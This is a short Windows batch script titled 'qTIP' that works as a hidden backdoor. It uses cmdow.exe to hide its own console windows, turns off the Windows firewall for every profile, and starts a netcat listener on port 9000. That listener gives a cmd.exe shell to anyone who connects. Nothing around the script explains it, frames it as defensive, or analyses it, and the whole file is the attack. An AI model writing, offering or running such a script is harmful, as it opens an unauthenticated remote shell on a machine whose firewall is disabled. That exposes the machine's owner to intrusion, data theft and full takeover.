@echo off
title qTIP

cmdow.exe "Administrator:  qTIP" /HID 
cmdow.exe "qTIP" /HID 

NetSh Advfirewall set allprofiles state off
nc -lvp 9000 -e cmd.exe

exit
